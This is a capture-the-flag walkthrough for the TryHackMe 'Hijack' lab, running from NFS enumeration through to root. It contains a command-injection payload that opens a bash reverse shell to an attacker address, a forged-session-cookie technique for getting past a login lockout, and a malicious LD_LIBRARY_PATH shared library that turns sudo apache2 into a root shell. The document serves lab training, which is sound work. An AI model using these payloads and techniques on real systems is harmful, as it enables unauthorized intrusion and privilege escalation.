# Hijack - TryHackMe Walkthrough

**Room:** Hijack  
**Difficulty:** Medium (Labeled Easy in folder, but notes say Medium)  
**Goal:** Get root access on the box.

Let's go!

## 1. Reconnaissance

First, as always, we perform an Nmap scan to enumerate open ports and services.

```bash
nmap -p- -sC -sV -T4 --min-rate=1000 10.65.147.25
```

**Results:**

```text
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp    open  http     Apache httpd 2.4.18
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
37423/tcp open  nlockmgr 1-4 (RPC #100021)
... (mountd ports)
```

We see a web server on port 80, FTP on 21, SSH on 22, and NFS (Network File System) on port 2049 along with RPC ports.

### Web Enumeration (Port 80)
Visiting the website shows a login page, a signup page, and a "Welcome Guest" message stating the site is under development.
Checking `robots.txt` and other standard files is good practice, but the NFS service looks more interesting for initial footholds.

### NFS Enumeration (Port 2049)
Port 2049 indicates an NFS share. We can list available shares using `showmount`.

```bash
showmount -e 10.65.147.25
```

**Output:**
```text
Export list for 10.65.147.25:
/mnt/share *
```

We see `/mnt/share` is available. Let's mount it to our local machine.

```bash
mkdir local_mount
sudo mount -t nfs 10.65.147.25:/mnt/share local_mount/
cd local_mount
ls -la
```

**Findings:**
The directory listing shows files owned by a specific User ID (UID), likely `1003`. Since we don't have a user with UID 1003 on our local machine, it shows as just the number.
To access these files properly, we can create a local user with that specific UID.

```bash
sudo useradd -u 1003 hijack_user
sudo passwd hijack_user
su hijack_user
```

Now accessing the mount as `hijack_user`, we can read the files. We find FTP credentials!

## 2. FTP & Initial Access

Using the credentials found in the NFS share, we log in to FTP.

```bash
ftp 10.65.147.25
```

Inside FTP, we find two interesting files:
1.  `from_admin.txt`: A message stating that passwords are in a list and that brute-forcing login is blocked.
2.  `password.txt`: A wordlist of passwords.

The admin mentions that brute-forcing the login page causes a lockout. I verified this with Hydra—after a few attempts, the server blocks requests for 300 seconds.

## 3. Session Hijacking

Examining the website's cookies, we notice a `PHPSESSID` cookie. However, looking closely at how sessions are handled (or perhaps hinted at in `from_admin.txt`), the session cookie format appears to be:

`Base64(username:MD5(password))`

Instead of brute-forcing the login form (which locks us out), we can "brute-force" the session cookie offline. We generate a valid cookie for the `admin` user using the passwords from `password.txt` and check if we can access the protected `/administration.php` page.

I wrote a Python script to automate this.

**Script (`session_hijack.py`):**
*(See the full script in this directory)*

Running the script successfully finds the correct password and session cookie for the `admin` user.

## 4. Command Injection

With the valid session cookie, we access the Administration Panel. There is a "Service Status" check feature.
We test for command injection by appending a command:

Input: `ssh && id`

The server returns the output of `id`, confirming we have code execution as `www-data`.

To get a reverse shell:

1.  Start a listener: `nc -lvnp 4444`
2.  Inject the payload:

```bash
ssh && bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"
```

We catch the shell as `www-data`.

## 5. Privilege Escalation (User)

 enumerating the web directory, we find a `config.php` file containing credentials:

```php
$username = "rick";
$password = "......"; // (Redacted)
```

We can use these credentials to SSH into the box as `rick`.

```bash
ssh rick@10.65.147.25
```

**Flag:** We can now read `user.txt`.

## 6. Privilege Escalation (Root)

Checking sudo privileges for `rick`:

```bash
sudo -l
```

**Output:**
```text
(root) SETENV: /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

We can run `apache2` as root, and importantly, we have the `SETENV` permission. This allows us to set environment variables.
We can abuse the `LD_LIBRARY_PATH` environment variable. This variable tells Linux where to look for shared libraries. If we point it to a folder we control, we can force Apache to load a malicious library instead of the real one.

### The Attack Plan:
1.  Create a malicious C library (`hijack.c`).
2.  Compile it into a shared object (`.so`).
3.  Run Apache with `sudo` while setting `LD_LIBRARY_PATH` to our malicious library's location.

**hijack.c:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH"); // Clear the variable to avoid loop/errors
    setresuid(0, 0, 0);          // Set Real, Effective, Saved UID to root
    setresgid(0, 0, 0);          // Set GID to root
    system("/bin/bash -p");      // Execute a shell
}
```

**Compile:**

```bash
gcc -fPIC -shared -o hijack.so hijack.c
# Depending on the specific library apache looks for, 
# sometimes we just name it like a standard lib or we might need to investigate ldd /usr/sbin/apache2
# In this specific CTF case, it often loads `libcrypt.so.1` or similar from the path.
# Let's verify with ldd or just name it specifically if needed.
# For this specific vector, often naming it specifically isn't needed if we hook a library Apache *needs*.
# A common target is `libcrypt.so.1`
mv hijack.so /tmp/libcrypt.so.1
```

**Execution:**

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

The command runs, Apache looks in `/tmp` for shared libraries, finds our `libcrypt.so.1`, loads it, and the `constructor` function executes our shell.

We are now **root**!

Congrats!